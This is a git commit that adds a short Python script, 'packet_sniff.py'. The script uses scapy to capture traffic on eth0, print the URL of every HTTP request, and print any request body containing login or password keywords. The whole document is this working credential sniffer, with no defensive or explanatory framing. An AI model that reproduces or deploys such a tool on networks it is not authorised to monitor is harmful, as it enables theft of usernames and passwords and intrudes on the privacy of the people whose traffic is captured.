e7039295c81f6ecf1ac4ef075f32ae55377d7054
SalkovAA <lexahouse@yandex.ru>
2022-02-17 15:04:32 -0500

    test

---
+++ Packet sniff/packet_sniff.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):
+    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):  
+        url = packet[http.HTTPRequest].Host .decode()+ packet[http.HTTPRequest].Path.decode()
+        print(url)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load.decode()
+            keywords = ["username", "user", "login", "password", "pass", "uname"]
+            for keyword in keywords:
+                    if keyword in load:
+                        print(load)
+                        break
+
+
+sniff("eth0")
